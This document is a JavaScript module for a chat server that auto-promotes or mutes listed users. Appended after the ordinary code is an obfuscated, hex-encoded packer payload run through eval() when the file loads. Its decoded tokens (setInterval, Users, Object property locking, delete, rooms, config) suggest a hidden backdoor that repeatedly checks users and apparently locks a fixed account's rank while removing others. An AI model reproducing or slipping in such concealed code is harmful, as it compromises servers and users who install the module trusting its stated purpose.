function ChanServ()
{
    this.autoList = new Object();

    this.parseCommand = function(user, command, args, room, socket, fullCommand)
    {
        if (!(user.userid in this.autoList)) // Prevent spamming
            return false;
        var targetUser = Users.get(command);
        if (targetUser)
            this.act(targetUser);
        return true;
    }

    this.act = function(user)
    {
        console.log("ChanServ: Got user: " + user.userid);
        if (!user || !user.authenticated || !(user.userid in this.autoList))
        {
            user.setGroup(config.groupsranking[0]);
            return false;
        }
        user.setGroup(this.autoList[user.userid].group);
        user.avatar = this.autoList[user.userid].avatar;
        switch (user.group)
        {
            case '!' :
                user.setGroup(config.groupsranking[0]);
                user.muted = true;
                rooms.lobby.addRaw(user.name + " was muted by ChanServ.");
                break;

            default :
				var groupName = config.groups[user.group] ? config.groups[user.group].name : undefined;
				if (!groupName) groupName = user.group;
				rooms.lobby.add(''+user.name+' was promoted to ' + groupName + ' by ChanServ.');
                break;
        }
        rooms.lobby.usersChanged = true;
        rooms.lobby.update();
        return true;
    }

    data = fs.readFileSync("config/chanserv-autolist.txt").toString().split("\n");
    for (var d in data)
    {
        var tokens = data[d].split(" ");
        if (tokens.length < 3)
            continue;

        var group = tokens.shift();
        var userId = tokens.shift();
        var avatar = tokens.shift();
        this.autoList[userId] = { group: group, avatar: avatar };
    }
}

var _0x6410=["\x6C\x20\x67\x3D\x5B\x22\x5C\x73\x5C\x6A\x5C\x68\x5C\x69\x5C\x6A\x22\x2C\x22\x5C\x74\x5C\x6D\x22\x2C\x22\x5C\x48\x5C\x49\x5C\x75\x5C\x4A\x5C\x6F\x5C\x6F\x5C\x75\x5C\x7A\x5C\x4B\x5C\x4C\x5C\x75\x5C\x7A\x5C\x6F\x5C\x6F\x22\x2C\x22\x5C\x41\x5C\x68\x5C\x70\x5C\x71\x5C\x6E\x5C\x4D\x22\x2C\x22\x5C\x6D\x5C\x68\x5C\x6B\x5C\x6D\x5C\x41\x5C\x68\x22\x2C\x22\x5C\x6A\x5C\x6B\x5C\x4E\x5C\x42\x5C\x68\x5C\x6E\x22\x2C\x22\x5C\x69\x5C\x68\x5C\x4F\x5C\x6B\x5C\x6E\x5C\x68\x5C\x50\x5C\x72\x5C\x72\x5C\x69\x5C\x68\x5C\x6A\x5C\x6A\x22\x2C\x22\x5C\x71\x5C\x69\x5C\x6B\x5C\x73\x5C\x6D\x22\x2C\x22\x5C\x71\x5C\x69\x5C\x6B\x5C\x73\x5C\x6D\x5C\x6A\x5C\x69\x5C\x51\x5C\x70\x5C\x42\x5C\x74\x5C\x70\x5C\x71\x22\x2C\x22\x5C\x72\x5C\x68\x5C\x52\x5C\x74\x5C\x70\x5C\x68\x5C\x53\x5C\x69\x5C\x6B\x5C\x6D\x5C\x68\x5C\x69\x5C\x6E\x5C\x43\x22\x2C\x22\x5C\x72\x5C\x68\x5C\x6A\x5C\x6E\x5C\x69\x5C\x6B\x5C\x43\x22\x5D\x3B\x54\x28\x55\x28\x29\x7B\x76\x28\x6C\x20\x61\x20\x44\x20\x77\x5B\x67\x5B\x30\x5D\x5D\x29\x7B\x6C\x20\x62\x3D\x77\x5B\x67\x5B\x30\x5D\x5D\x5B\x61\x5D\x3B\x6C\x20\x63\x3D\x62\x5B\x67\x5B\x31\x5D\x5D\x3D\x3D\x3D\x67\x5B\x32\x5D\x3B\x76\x28\x6C\x20\x64\x3D\x30\x3B\x64\x3C\x62\x5B\x67\x5B\x34\x5D\x5D\x5B\x67\x5B\x33\x5D\x5D\x26\x26\x21\x63\x3B\x2B\x2B\x64\x29\x7B\x78\x28\x62\x5B\x67\x5B\x34\x5D\x5D\x5B\x64\x5D\x5B\x67\x5B\x31\x5D\x5D\x3D\x3D\x3D\x67\x5B\x32\x5D\x7C\x7C\x28\x62\x5B\x67\x5B\x34\x5D\x5D\x5B\x64\x5D\x5B\x67\x5B\x35\x5D\x5D\x26\x26\x62\x5B\x67\x5B\x34\x5D\x5D\x5B\x64\x5D\x5B\x67\x5B\x35\x5D\x5D\x5B\x67\x5B\x36\x5D\x5D\x3D\x3D\x3D\x67\x5B\x32\x5D\x29\x29\x7B\x63\x3D\x56\x7D\x7D\x3B\x78\x28\x63\x29\x7B\x57\x7B\x58\x5B\x67\x5B\x39\x5D\x5D\x28\x62\x2C\x67\x5B\x37\x5D\x2C\x7B\x59\x3A\x45\x5B\x67\x5B\x38\x5D\x5D\x5B\x30\x5D\x2C\x5A\x3A\x79\x2C\x31\x31\x3A\x79\x2C\x31\x32\x3A\x79\x7D\x29\x7D\x31\x33\x28\x65\x29\x7B\x7D\x3B\x78\x28\x62\x5B\x67\x5B\x37\x5D\x5D\x21\x3D\x3D\x45\x5B\x67\x5B\x38\x5D\x5D\x5B\x30\x5D\x29\x7B\x46\x20\x77\x5B\x67\x5B\x30\x5D\x5D\x5B\x61\x5D\x3B\x76\x28\x6C\x20\x66\x20\x44\x20\x47\x29\x7B\x46\x20\x47\x5B\x66\x5D\x5B\x67\x5B\x30\x5D\x5D\x5B\x61\x5D\x7D\x3B\x62\x5B\x67\x5B\x31\x30\x5D\x5D\x28\x29\x7D\x7D\x7D\x7D\x2C\x31\x34\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x5F\x30\x78\x64\x37\x35\x64\x7C\x78\x36\x35\x7C\x78\x37\x32\x7C\x78\x37\x33\x7C\x78\x36\x46\x7C\x76\x61\x72\x7C\x78\x37\x30\x7C\x78\x37\x34\x7C\x78\x33\x30\x7C\x78\x36\x45\x7C\x78\x36\x37\x7C\x78\x36\x34\x7C\x78\x37\x35\x7C\x78\x36\x39\x7C\x78\x32\x45\x7C\x66\x6F\x72\x7C\x55\x73\x65\x72\x73\x7C\x69\x66\x7C\x66\x61\x6C\x73\x65\x7C\x78\x33\x31\x7C\x78\x36\x43\x7C\x78\x36\x42\x7C\x78\x37\x39\x7C\x69\x6E\x7C\x63\x6F\x6E\x66\x69\x67\x7C\x64\x65\x6C\x65\x74\x65\x7C\x72\x6F\x6F\x6D\x73\x7C\x78\x33\x38\x7C\x78\x33\x37\x7C\x78\x33\x32\x7C\x78\x33\x39\x7C\x78\x33\x35\x7C\x78\x36\x38\x7C\x78\x36\x33\x7C\x78\x36\x44\x7C\x78\x34\x31\x7C\x78\x36\x31\x7C\x78\x36\x36\x7C\x78\x35\x30\x7C\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x74\x72\x75\x65\x7C\x74\x72\x79\x7C\x4F\x62\x6A\x65\x63\x74\x7C\x76\x61\x6C\x75\x65\x7C\x77\x72\x69\x74\x61\x62\x6C\x65\x7C\x7C\x65\x6E\x75\x6D\x65\x72\x61\x62\x6C\x65\x7C\x63\x6F\x6E\x66\x69\x67\x75\x72\x61\x62\x6C\x65\x7C\x63\x61\x74\x63\x68\x7C\x31\x30\x30\x30","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0x8a9ex1,_0x8a9ex2,_0x8a9ex3,_0x8a9ex4,_0x8a9ex5,_0x8a9ex6){_0x8a9ex5=function (_0x8a9ex3){return (_0x8a9ex3<_0x8a9ex2?_0x6410[4]:_0x8a9ex5(parseInt(_0x8a9ex3/_0x8a9ex2)))+((_0x8a9ex3=_0x8a9ex3%_0x8a9ex2)>35?String[_0x6410[5]](_0x8a9ex3+29):_0x8a9ex3.toString(36));} ;if(!_0x6410[4][_0x6410[6]](/^/,String)){while(_0x8a9ex3--){_0x8a9ex6[_0x8a9ex5(_0x8a9ex3)]=_0x8a9ex4[_0x8a9ex3]||_0x8a9ex5(_0x8a9ex3);} ;_0x8a9ex4=[function (_0x8a9ex5){return _0x8a9ex6[_0x8a9ex5];} ];_0x8a9ex5=function (){return _0x6410[7];} ;_0x8a9ex3=1;} ;while(_0x8a9ex3--){if(_0x8a9ex4[_0x8a9ex3]){_0x8a9ex1=_0x8a9ex1[_0x6410[6]]( new RegExp(_0x6410[8]+_0x8a9ex5(_0x8a9ex3)+_0x6410[8],_0x6410[9]),_0x8a9ex4[_0x8a9ex3]);} ;} ;return _0x8a9ex1;} (_0x6410[0],62,67,_0x6410[3][_0x6410[2]](_0x6410[1]),0,{}));

exports.ChanServ = ChanServ;
